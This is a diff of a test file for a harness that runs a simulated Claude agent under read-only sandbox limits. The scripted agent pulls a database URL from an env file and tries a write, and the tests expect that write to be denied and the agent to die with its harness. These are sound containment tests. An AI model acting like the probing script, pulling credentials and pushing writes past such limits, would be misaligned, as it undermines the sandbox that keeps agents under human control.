+        `echo "test: $('${process.execPath}' test math.test.ts 2>&1 | grep -Eo '[0-9]+ pass' | head -1)"`,
+        `url=$(sed -n 's/^DATABASE_URL=//p' .env.e2e); echo "db: $('${PG}/psql' "$url" -tAc 'select note from notes' 2>&1)"`,
+        `url=$(sed -n 's/^DATABASE_URL=//p' .env.e2e); echo "db-write: $('${PG}/psql' "$url" -tAc "insert into notes values ('x')" 2>&1 | head -1)"`,
+      ].join("; ");
+      // The replay: line replay's clone of the repository, its linked dependencies and its env file with the read-only URL.
+      fs.mkdirSync(h.runDir, { recursive: true });
+      const at = replayCwd(top, { context: { project_path: top }, completed: [] }, false, h.runDir, { file: ".env.e2e", key: "DATABASE_URL" });
+      if ("reason" in at) throw new Error(at.reason);
+      const replay = h.runWith({ FAKE_CLAUDE_BASH: agent, DRY_RUN_HIDE_REGEX: at.hide ?? "" }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake", "--cwd", at.cwd, "--read-only", ...(at.reads ?? []).flatMap((r) => ["--read", r]), "--allow-port", String(at.port));
+      expect(replay.err).toBe("");
+      const replaySaid = h.recorded("bash")!;
+      console.log(`line replay (clone ${at.cwd}):\n${replaySaid}`);
+      expect(replaySaid).toContain("log: e2e-commit");
+      expect(replaySaid).toContain("test: 1 pass");
+      expect(replaySaid).toContain("db: from-the-db");
+      expect(replaySaid).toMatch(/db-write: .*permission denied/);
+      // The Try station: a worktree of the repository (its .git points into the main checkout's), read-only.
+      const wt = path.join(h.dir, "wt");
+      git(top, "worktree", "add", "-q", wt);
+      fs.symlinkSync(path.join(top, "node_modules"), path.join(wt, "node_modules"));
+      fs.copyFileSync(path.join(top, ".env.e2e"), path.join(wt, ".env.e2e"));
+      const h2 = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
+      const tryAgent = agent.replace(/\.env\.e2e/g, "/dev/null");
+      const station = h2.runWith({ FAKE_CLAUDE_BASH: tryAgent }, "--run", h2.runDir, "--prompt", h2.prompt, "--model", "m", "--account", "fake", "--cwd", wt, "--read-only", "--read", path.join(top, "node_modules"));
+      expect(station.err).toBe("");
+      const stationSaid = h2.recorded("bash")!;
+      console.log(`Try station (worktree ${wt}):\n${stationSaid}`);
+      expect(stationSaid).toContain("log: e2e-commit");
+      expect(stationSaid).toContain("test: 1 pass");
+      // A station's checkout keeps its env files to itself: the database is reachable only for a replay that was given its URL.
+      expect(fs.readFileSync(path.join(wt, ".env.e2e"), "utf8")).toContain("reader@");
+    } finally {
+      Bun.spawnSync([`${PG}/pg_ctl`, "-D", pg, "-m", "immediate", "stop"]);
+    }
+  }, 120_000);
+
   test.if(process.platform === "darwin")("a guard that cannot answer stops the run before any agent starts", () => {
     const h = harnessWorld([{ type: "result", result: "Done.", is_error: false }]);
     const broken = path.join(h.dir, "broken-guard");
@@ -630,7 +987,7 @@ describe("prompt-dry-run.ts", () => {
   test.if(process.platform === "darwin")("the agent dies with its harness, even when the harness is killed outright", async () => {
     const h = harnessWorld([{ type: "result", result: "Done.", is_error: false }]);
     const p = Bun.spawn(["bun", HARNESS, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake"], {
-      env: { PATH: `${h.bin}:${path.dirname(process.execPath)}:/usr/bin:/bin`, HOME: h.dir, CODECAST_DIR: h.state, FAKE_CLAUDE_REC: h.rec, FAKE_CLAUDE_STREAM: path.join(h.dir, "stream.jsonl"), FAKE_CLAUDE_BASH: `echo $$ > "$FAKE_CLAUDE_REC/agent-pid"; sleep 120` },
+      env: { PATH: `${h.bin}:${path.dirname(process.execPath)}:/usr/bin:/bin`, HOME: h.dir, CODECAST_DIR: h.state, FAKE_CLAUDE_REC: h.rec, FAKE_CLAUDE_STREAM: path.join(h.rec, "stream.jsonl"), DRY_RUN_PASS_ENV: "FAKE_CLAUDE_REC,FAKE_CLAUDE_STREAM,FAKE_CLAUDE_BASH", FAKE_CLAUDE_BASH: `echo $$ > "$FAKE_CLAUDE_REC/agent-pid"; sleep 120` },
       stdout: "ignore", stderr: "ignore",
     });
     const until = async (ok: () => boolean, ms: number) => { const end = Date.now() + ms; while (!ok() && Date.now() < end) await Bun.sleep(200); return ok(); };
